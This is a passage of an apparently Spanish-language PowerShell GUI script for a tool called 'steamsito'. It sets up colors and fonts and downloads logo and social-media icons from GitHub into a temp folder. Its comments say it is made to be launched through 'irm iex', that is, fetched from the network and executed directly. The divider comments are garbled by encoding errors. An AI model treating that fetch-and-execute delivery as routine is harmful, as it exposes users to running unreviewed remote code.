# ÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚Â
#  COLORS & FONTS
# ÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚Â
$script:BG=[System.Drawing.Color]::FromArgb(11,15,25)
$script:CardBG=[System.Drawing.Color]::FromArgb(18,24,38)
$script:CardHover=[System.Drawing.Color]::FromArgb(25,33,52)
$script:CardBorder=[System.Drawing.Color]::FromArgb(32,48,68)
$script:InputBG=[System.Drawing.Color]::FromArgb(14,18,30)
$script:White=[System.Drawing.Color]::White
$script:Gray=[System.Drawing.Color]::FromArgb(130,142,162)
$script:Green=[System.Drawing.Color]::FromArgb(60,220,100)
$script:Cyan=[System.Drawing.Color]::FromArgb(0,180,230)
$script:PegarBtnBG=[System.Drawing.Color]::FromArgb(30,40,58)
$script:PegarBtnBGH=[System.Drawing.Color]::FromArgb(40,55,78)
$script:Yellow=[System.Drawing.Color]::FromArgb(255,210,0)
$script:Orange=[System.Drawing.Color]::FromArgb(255,160,40)
$script:Red=[System.Drawing.Color]::FromArgb(255,70,70)
$script:TikPink=[System.Drawing.Color]::FromArgb(254,44,85)
$script:TikCyan=[System.Drawing.Color]::FromArgb(37,244,238)
$script:DiscordBlue=[System.Drawing.Color]::FromArgb(88,101,242)
$script:GreenBtn=[System.Drawing.Color]::FromArgb(45,200,100)
$script:GreenBtnH=[System.Drawing.Color]::FromArgb(35,175,85)

$script:FntTitle=New-Object System.Drawing.Font("Bahnschrift SemiBold",24,[System.Drawing.FontStyle]::Bold)
$script:FntAct=New-Object System.Drawing.Font("Bahnschrift Light",10)
$script:FntCard=New-Object System.Drawing.Font("Bahnschrift SemiBold",12,[System.Drawing.FontStyle]::Bold)
$script:FntSub=New-Object System.Drawing.Font("Segoe UI",8.5)
$script:FntArrow=New-Object System.Drawing.Font("Segoe UI",14,[System.Drawing.FontStyle]::Bold)
$script:FntSalir=New-Object System.Drawing.Font("Bahnschrift SemiBold",11,[System.Drawing.FontStyle]::Bold)
$script:FntSect=New-Object System.Drawing.Font("Bahnschrift SemiBold",13,[System.Drawing.FontStyle]::Bold)
$script:FntCodeT=New-Object System.Drawing.Font("Bahnschrift SemiBold",9.5,[System.Drawing.FontStyle]::Bold)
$script:FntCodeS=New-Object System.Drawing.Font("Segoe UI",8)
$script:FntCodeSt=New-Object System.Drawing.Font("Bahnschrift",7.5,[System.Drawing.FontStyle]::Bold)
$script:FntBack=New-Object System.Drawing.Font("Bahnschrift SemiBold",10,[System.Drawing.FontStyle]::Bold)
$script:FntRedeemTitle=New-Object System.Drawing.Font("Bahnschrift SemiBold",14,[System.Drawing.FontStyle]::Bold)
$script:FntSubmit=New-Object System.Drawing.Font("Bahnschrift SemiBold",9.5,[System.Drawing.FontStyle]::Bold)

$script:activeCodes=[System.Collections.ArrayList]@()
$CR=10

function New-RR{param([float]$x,[float]$y,[float]$w,[float]$h,[float]$r)
    $p=New-Object System.Drawing.Drawing2D.GraphicsPath;$d=$r*2
    $p.AddArc($x,$y,$d,$d,180,90);$p.AddArc($x+$w-$d,$y,$d,$d,270,90)
    $p.AddArc($x+$w-$d,$y+$h-$d,$d,$d,0,90);$p.AddArc($x,$y+$h-$d,$d,$d,90,90)
    $p.CloseFigure();return $p}

# ÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚Â
#  LOAD USER IMAGE AS CIRCULAR LOGO
# ÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚Â
# For irm iex compatibility: icons stored in temp dir
$script:iconDir = Join-Path $env:TEMP "bsmap_icons"
if (-not (Test-Path $script:iconDir)) { New-Item -ItemType Directory -Path $script:iconDir -Force | Out-Null }
# Download logo from GitHub
$logoFile = $null
$logoPath = Join-Path $script:iconDir "logo.jpg"
try {
    if (-not (Test-Path $logoPath)) { Invoke-RestMethod -Uri "https://raw.githubusercontent.com/bastisayes/steamsito/main/logo.jpg" -UseBasicParsing -OutFile $logoPath -ErrorAction SilentlyContinue }
    if (Test-Path $logoPath) { $logoFile = Get-Item $logoPath }
} catch {}
$script:LS = 72
$script:logoBmp = New-Object System.Drawing.Bitmap($script:LS, $script:LS)
$lg = [System.Drawing.Graphics]::FromImage($script:logoBmp)
$lg.SmoothingMode = 'AntiAlias'
$lg.PixelOffsetMode = 'HighQuality'
$lg.InterpolationMode = 'HighQualityBicubic'

if ($logoFile) {
    $src = [System.Drawing.Image]::FromFile($logoFile.FullName)
    # Crop to square from center
    $minDim = [Math]::Min($src.Width, $src.Height)
    $cropX = [int](($src.Width - $minDim) / 2)
    $cropY = [int](($src.Height - $minDim) / 2)
    $cropRect = New-Object System.Drawing.Rectangle($cropX, $cropY, $minDim, $minDim)
    # Clip to circle
    $cp = New-Object System.Drawing.Drawing2D.GraphicsPath
    $cp.AddEllipse(0, 0, $script:LS, $script:LS)
    $lg.SetClip($cp)
    $lg.DrawImage($src, (New-Object System.Drawing.Rectangle(0, 0, $script:LS, $script:LS)), $cropRect, [System.Drawing.GraphicsUnit]::Pixel)
    $lg.ResetClip()
    $bp = New-Object System.Drawing.Pen([System.Drawing.Color]::FromArgb(70, 100, 140), 2.5)
    $lg.DrawEllipse($bp, 1, 1, $script:LS-3, $script:LS-3)
    $bp.Dispose(); $cp.Dispose(); $src.Dispose()
} else {
    # Fallback: draw Argentina flag
    $cp2 = New-Object System.Drawing.Drawing2D.GraphicsPath
    $cp2.AddEllipse(0,0,$script:LS,$script:LS); $lg.SetClip($cp2)
    $cel = New-Object System.Drawing.SolidBrush([System.Drawing.Color]::FromArgb(108,172,228))
    $lg.FillRectangle($cel, 0, 0, $script:LS, $script:LS); $cel.Dispose()
    $wh = New-Object System.Drawing.SolidBrush([System.Drawing.Color]::White)
    $sh = [int]($script:LS/3); $lg.FillRectangle($wh, 0, $sh, $script:LS, $sh); $wh.Dispose()
    $lg.ResetClip(); $cp2.Dispose()
}
$lg.Dispose()

# Load TikTok & Discord icons from image files
$script:iconSize = 38
function Load-IconBmp([string]$filePath, [int]$sz) {
    $bmp = New-Object System.Drawing.Bitmap($sz, $sz)
    $ig2 = [System.Drawing.Graphics]::FromImage($bmp)
    $ig2.SmoothingMode = 'AntiAlias'
    $ig2.InterpolationMode = 'HighQualityBicubic'
    $ig2.PixelOffsetMode = 'HighQuality'
    if (Test-Path $filePath) {
        $srcI = [System.Drawing.Image]::FromFile($filePath)
        $minD = [Math]::Min($srcI.Width, $srcI.Height)
        $cx2 = [int](($srcI.Width - $minD) / 2)
        $cy2 = [int](($srcI.Height - $minD) / 2)
        $cropR = New-Object System.Drawing.Rectangle($cx2, $cy2, $minD, $minD)
        # Round clip
        $cpI = New-Object System.Drawing.Drawing2D.GraphicsPath
        $cpI.AddEllipse(0, 0, $sz, $sz)
        $ig2.SetClip($cpI)
        $ig2.DrawImage($srcI, (New-Object System.Drawing.Rectangle(0, 0, $sz, $sz)), $cropR, [System.Drawing.GraphicsUnit]::Pixel)
        $ig2.ResetClip()
        $cpI.Dispose(); $srcI.Dispose()
    }
    $ig2.Dispose()
    return $bmp
}
# Download icons from GitHub to temp (for irm iex compatibility)
$script:tiktokBmp = $null; $script:discordBmp = $null
try {
    $iconsBase = "https://raw.githubusercontent.com/bastisayes/steamsito/main"
    $tPath = Join-Path $script:iconDir "tiktok.jpg"; $dPath = Join-Path $script:iconDir "discord.jpg"
    if (-not (Test-Path $tPath)) { Invoke-RestMethod -Uri "$iconsBase/tiktok.jpg" -UseBasicParsing -OutFile $tPath -ErrorAction SilentlyContinue }
    if (-not (Test-Path $dPath)) { Invoke-RestMethod -Uri "$iconsBase/discord.jpg" -UseBasicParsing -OutFile $dPath -ErrorAction SilentlyContinue }
    if (Test-Path $tPath) { $script:tiktokBmp = Load-IconBmp $tPath $script:iconSize }
    if (Test-Path $dPath) { $script:discordBmp = Load-IconBmp $dPath $script:iconSize }
} catch {}

# ÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚